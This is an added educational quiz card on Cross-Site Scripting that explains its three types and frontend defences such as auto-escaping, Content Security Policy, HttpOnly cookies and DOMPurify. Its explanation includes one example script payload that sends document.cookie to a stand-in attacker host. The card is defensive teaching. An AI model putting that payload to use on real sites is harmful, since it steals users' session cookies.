@@ -1,0 +1,28 @@
+---
+id: "security-xss"
+level: "Intermediate"
+q: "What is Cross-Site Scripting (XSS), and how do modern frontend frameworks protect against it?"
+wrong: "XSS is when a hacker <Bad>hacks your database</Bad> to steal user passwords directly."
+takeaway: "XSS occurs when an attacker <Good>injects untrusted JavaScript into a vulnerable webpage</Good>, which executes in other users' browsers to hijack sessions or steal sensitive tokens."
+---
+
+# Why it misses
+XSS is a client-side code injection attack. If an attacker injects `<script>fetch('attacker.com/steal?c=' + document.cookie)</script>` into a comment field and your app renders it raw, that script executes with the full security context of every user who views that comment.
+
+<Steps>
+  <Step icon="flag" title="1. The 3 Types of XSS">
+    - **Stored XSS**: Malicious script is saved persistently in the database and served to all viewers.
+    - **Reflected XSS**: Script is injected via URL query parameters and reflected immediately in the response.
+    - **DOM-based XSS**: Vulnerable client-side JS directly executes unsanitized input using `eval()` or `element.innerHTML`.
+  </Step>
+  <Step icon="shield" title="2. Framework Context-Aware Auto-Escaping">
+    React, Vue, and Angular automatically escape embedded variables (e.g. `{userInput}` converts `<` into `&lt;` and `>` into `&gt;`), rendering malicious payloads harmlessly as plain text.
+  </Step>
+  <Step icon="lock" title="3. Content Security Policy (CSP) & HttpOnly Cookies">
+    Setting `Content-Security-Policy: default-src 'self'` prevents browsers from running inline scripts or reaching unauthorized attacker domains. Setting `HttpOnly` on cookies prevents JavaScript from ever reading session cookies via `document.cookie`.
+  </Step>
+</Steps>
+
+<Tip title="React Danger Zone">
+Never use `dangerouslySetInnerHTML={{ __html: rawInput }}` unless you have sanitized the HTML using a battle-tested library like **DOMPurify**.
+</Tip>
